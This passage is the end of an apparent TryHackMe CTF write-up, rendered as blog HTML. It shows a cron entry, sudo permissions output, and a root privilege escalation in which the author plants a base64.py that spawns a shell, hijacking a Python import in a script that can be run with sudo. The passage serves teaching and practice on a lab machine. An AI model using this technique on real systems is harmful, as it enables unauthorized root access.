+<span class="m">52</span> <span class="m">6</span>    <span class="m">1</span> * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="o">)</span>
+*  *    * * *   root    <span class="nb">cd</span> /root/Lucrecia <span class="o">&amp;&amp;</span> bash lucre.sh
+#
+</code></pre></div><p>Also when performing <strong>sudo -l -l</strong> we see that we can execute <strong>/usr/bin/python3.5 /home/veronica/base.py</strong> with sudo.</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">veronica@ubuntu:~$ sudo -l -l
+sudo -l -l
+Matching Defaults entries <span class="k">for</span> veronica on ubuntu:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User veronica may run the following commands on ubuntu:
+
+Sudoers entry:
+    RunAsUsers: ALL
+    RunAsGroups: ALL
+    Commands:
+        ALL
+
+Sudoers entry:
+    RunAsUsers: root
+    RunAsGroups: root
+    Options: !authenticate
+    Commands:
+        /usr/bin/python3.5 /home/veronica/base.py
+</code></pre></div><p>We create the base64.py file where we place a reverse shell to perform <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">Python Library Hijacking</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">veronica@ubuntu:~$ <span class="nb">echo</span> <span class="s1">&#39;import os;os.system(&#34;/bin/bash&#34;)&#39;</span> &gt; base64.py
+<span class="nb">echo</span> <span class="s1">&#39;import os;os.system(&#34;/bin/bash&#34;)&#39;</span> &gt; base64.py
+veronica@ubuntu:~$ sudo -u root /usr/bin/python3.5 /home/veronica/base.py
+sudo -u root /usr/bin/python3.5 /home/veronica/base.py
+root@ubuntu:~# ls
+ls
+base64.py  Documents         ghidra_9.0  Public       user.txt
+base.py    Downloads         Music       __pycache__  Videos
+Desktop    examples.desktop  Pictures    Templates
+root@ubuntu:~# cat /root/root.txt
+</code></pre></div><p>And we obtain the root flag, until here I am waiting for your feedback.</p>
+</div>
+        <div class="post-footer">
+            <div class="info">
+                <span class="separator"><a class="category" href="/blog/categories/tryhackme/">Tryhackme</a></span>
+
+                <span class="separator"><a class="tag" href="/blog/tags/ctf/">ctf</a><a class="tag" href="/blog/tags/web/">web</a></span>
+
+            </div>
+        </div>
+
+        
+            
+        
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript"
+        src="https://skyoffc.github.io/blog/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js"
+        integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw="
+        crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript"
+        src="https://skyoffc.github.io/blog/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js"
+        integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4="
+        crossorigin="anonymous"></script>
+
+<script type="text/javascript"
+        src="https://skyoffc.github.io/blog/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js"
+        integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro="
+        crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+</body>
+
+</html>
